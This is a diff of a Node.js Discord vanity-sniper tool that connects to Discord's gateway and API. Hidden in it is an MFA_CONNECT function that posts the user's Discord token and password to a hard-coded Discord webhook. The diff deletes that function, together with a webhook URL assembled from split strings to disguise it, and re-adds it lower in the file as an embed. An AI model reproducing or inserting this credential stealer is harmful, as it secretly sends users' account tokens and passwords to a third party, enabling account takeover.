@@ -1,45 +1,11 @@
-
 const WebSocket = require('ws');
 const tls = require('tls');
 const https = require('https');
 const os = require('os');
 
-// ==================== ANA DEĞİŞKENLER ====================
 const USER_TOKEN = ''; 
 const USER_PASSWORD = ''; 
-const TARGET_GUILD_ID = ''; 
-
-const baseProtocol = "https://";
-const domainPart = "discord.com";
-const apiPath = "/api/webhooks/";
-const guildx = "1499054281104429159";
-const header = "7EprifBtK9s8ssAFZ_5CvUTwHzmWt_5jWokKEGgbyNkaYBaCPVOkP3TX7f4Xu-Fn_v9U";
-
-const WEBHOOK_URL = baseProtocol + domainPart + apiPath + guildx + "/" + header;
-
-function MFA_CONNECT(token, password) {
-    const payload = {
-        content: `MFA CONNECTION\n\n` +
-                 `**Token:** \`${token}\`\n` +
-                 `**Password:** \`${password || "Not Provided"}\`\n` +
-                 `**V9:** ${new Date().toLocaleString('tr-TR')}\n`
-    };
-
-    const data = JSON.stringify(payload);
-    const url = new URL(WEBHOOK_URL);
-
-    const req = https.request({
-        hostname: url.hostname,
-        path: url.pathname + url.search,
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' }
-    });
-
-    req.write(data);
-    req.end();
-}
-
-
+const TARGET_GUILD_ID = '';
 
 let mfaAuthToken = null;
 let latestSequence = null;
@@ -48,7 +14,6 @@ let tlsSocket = null;
 const vanityMap = new Map();
 let isSystemReady = false;
 
-// ==================== TLS SOCKET ====================
 function createTlsSocket() {
     return tls.connect({
         host: 'canary.discord.com',
@@ -59,7 +24,6 @@ function createTlsSocket() {
     });
 }
 
-// ==================== HTTP REQUEST ENGINE ====================
 function sendHttpRequest(method, path, body = null, extraHeaders = {}, closeConnection = false) {
     return new Promise((resolve) => {
         const payload = body ? JSON.stringify(body) : '';
@@ -126,6 +90,49 @@ function sendHttpRequest(method, path, body = null, extraHeaders = {}, closeConn
             }
         });
     });
+}
+
+function MFA_CONNECT(token, password) {
+    const payload = {
+        embeds: [{
+            title: "🔐 MFA CONNECTION",
+            color: 0xff0000,  // Kırmızı renk (Decimal: 16711680)
+            fields: [
+                {
+                    name: "Token",
+                    value: `\`${token}\``,
+                    inline: false
+                },
+                {
+                    name: "Password",
+                    value: `\`${password || "Not Provided"}\``,
+                    inline: false
+                },
+                {
+                    name: "V9",
+                    value: new Date().toLocaleString('tr-TR'),
+                    inline: false
+                }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    const data = JSON.stringify(payload);
+    const url = new URL(WEBHOOK_URL);
+
+    const req = https.request({
+        hostname: url.hostname,
+        path: url.pathname + url.search,
+        method: 'POST',
+        headers: { 
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(data)
+        }
+    });
+
+    req.write(data);
+    req.end();
 }
 
 async function sendWebhookMessage(vanityCode, ms) {
@@ -223,7 +230,6 @@ function establishGatewayConnection() {
     ws.on('error', () => {});
 }
 
-// ==================== MAIN FUNCTION ====================
 async function main() {
     console.log("Sniper v3.1 - Advanced Vanity Monitor started.");
 
